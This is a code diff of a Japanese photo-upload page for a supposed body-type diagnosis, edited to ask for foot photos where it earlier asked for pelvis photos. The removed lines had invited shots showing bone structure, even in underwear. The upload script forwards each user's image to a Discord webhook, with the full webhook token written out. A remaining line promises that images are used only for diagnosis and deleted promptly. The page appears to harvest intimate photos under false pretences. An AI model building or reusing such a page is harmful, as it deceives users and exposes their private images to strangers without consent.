@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>体癖・雰囲気診断 - 骨盤の写真アップロード</title>
+  <title>体癖・雰囲気診断 - 足の写真アップロード</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <style>
@@ -46,8 +46,8 @@
 </script>
 <body>
   <div class="container">
-    <h1>写真診断 骨盤</h1>
-    <p>骨盤周辺の写真をアップロードしてください。</p>
+    <h1>写真診断 足</h1>
+    <p>足周辺の写真をアップロードしてください。</p>
 
     <img src="./images_shindan/股下01.png" alt="骨盤の撮影範囲ガイド" style="max-width: 150px; height: auto; display: block; margin: 20px auto;">
 
@@ -76,7 +76,7 @@
       const formData = new FormData();
       formData.append("file", file);
       formData.append("username", "体癖診断");
-      formData.append("content", "下半身の写真");
+      formData.append("content", "足の写真");
 
       try {
         await fetch("https://discord.com/api/webhooks/1427217615415414817/b_fvcnUsz06HSf21aXN5N5Mr0m5mxjLWDEnO4I3Xng5n5Pr4s-9--XxXfu606pkTE-S4", {
@@ -99,10 +99,8 @@
     <p class="precautions-title">📝 <strong>診断前のご注意</strong></p>
     <ul class="precautions-list">
   <ul>
-    <li>骨盤周りが正面からはっきりと写っている写真をご利用ください。</li>
+    <li>足の甲が上からはっきりと写っている写真をご利用ください。</li>
     <li>写真内に範囲が収まるよう広く撮影してください。</li>
-    <li>正確な診断のため、骨盤の骨構造がわかる画像をご使用ください。</li>
-    <li>下着を着用したままの撮影も精度が下がりますが可能です。</li>
     <li>アップロードされた画像は診断のみに使用され、完了後は速やかに削除されます。</li>
     <li>画像診断には数秒かかります。「次に進む」ボタンを押した後はそのまましばらくお待ちください。</li>
     <li>加工された画像や他人の画像の使用はご遠慮ください。</li>
